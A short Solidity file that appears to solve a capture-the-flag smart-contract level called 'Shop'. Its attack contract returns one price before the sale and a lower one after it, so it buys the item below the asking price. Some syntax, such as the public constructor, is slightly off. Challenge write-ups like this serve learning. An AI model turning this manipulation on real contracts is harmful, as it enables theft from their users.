// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract ShopAttack is Buyer{
    Shop public shop;

    constructor(Shop _shop) public {
        shop = _shop;
    }

    function buy() public {
        shop.buy();
    }

    function price() public view override returns(uint) {
        return shop.isSold ? 0:100;
    }
    
}

//deploy this contract with the shop challenge levels addresss